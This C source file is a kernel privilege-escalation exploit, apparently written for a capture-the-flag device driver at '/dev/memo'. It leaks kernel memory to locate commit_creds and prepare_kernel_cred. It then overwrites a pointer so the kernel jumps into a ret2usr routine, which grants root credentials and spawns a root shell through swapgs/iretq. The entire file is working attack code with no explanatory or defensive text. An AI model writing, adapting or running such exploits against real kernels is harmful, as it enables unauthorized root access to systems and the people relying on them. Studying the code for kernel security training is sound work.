#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <sys/ioctl.h>

#define MEMO_DEVICE "/dev/memo"
#define DATA_SIZE 128

#define MEMO_IOC_MAGIC 'm'
#define MEMO_ALLOC _IO(MEMO_IOC_MAGIC, 1)
#define MEMO_READ _IOW(MEMO_IOC_MAGIC, 2, memo_ioctl_data*)
#define MEMO_WRITE _IOW(MEMO_IOC_MAGIC, 3, memo_ioctl_data*)
#define MEMO_FREE  _IO(MEMO_IOC_MAGIC, 4)

void *(*commit_creds)(void *);
void *(*prepare_kernel_cred)(void *);

typedef struct memo_ioctl_data {
    int index;
    char data[128];
} memo_ioctl_data;

void _alloc(int fd) {
    ioctl(fd, MEMO_ALLOC);
}

void _read(int fd, int index, char* buf) {
	memo_ioctl_data read_data;
    read_data.index = index;
	memset(buf, NULL, DATA_SIZE);
	ioctl(fd, MEMO_READ, &read_data);
	strncpy(buf, read_data.data, DATA_SIZE);
}

void _write(int fd, int index, char* data) {
	memo_ioctl_data write_data;
    memset(&write_data, 0, sizeof(memo_ioctl_data));
    write_data.index = index;
	strncpy(write_data.data, data, DATA_SIZE);
	ioctl(fd, MEMO_WRITE, &write_data);
}

void _free(int fd) {
    ioctl(fd, MEMO_FREE);
}

void get_shell() {
    system("/bin/sh");
    exit(0);
}

size_t dummy_stack[512] __attribute__((aligned(16)));

void ret2usr() {
    static struct registers {
        void* rip;
        size_t cs;
        size_t rflags;
        void* rsp;
        size_t ss;
    } rg = {
        .rip = &get_shell,
        .cs = 0x33,
        .rflags = 0x202,
        .rsp = dummy_stack + 512,
        .ss = 0x2b
    };

    volatile register size_t RSP asm("rsp");
    commit_creds(prepare_kernel_cred(0));
    RSP = (uint64_t)&rg;
    asm volatile(
        "cli\n\t"
        "swapgs\n\t"
        "iretq"
        ::"r" (RSP)
    );
}

int main() {
    int fd = open(MEMO_DEVICE, O_RDWR);
    char* buf = malloc(DATA_SIZE);
    
    for(int i=0; i<10; i++) {
        _alloc(fd);
        char c = 65+i;
        _write(fd, i, &c);
    }

    char result[0x2000] = {0, };
    read(fd, result, sizeof(result));
    write(1, result, 0x2000);
    int offset = 0;
    for(int i=0; i<0x2000; i++) {
        if(result[i] == '1' && result[i+1] == '0') {
            offset = i;
        }
    }

    size_t kern_addr = *(size_t*)(&result[offset+5]);
    commit_creds = kern_addr;
    prepare_kernel_cred = commit_creds + 800;

    printf("commit_creds : %p\n", commit_creds);
    printf("prepare_kernel_cred : %p\n", prepare_kernel_cred);

    size_t addr = &ret2usr;
    write(fd, &addr, 8);
    close(fd);
}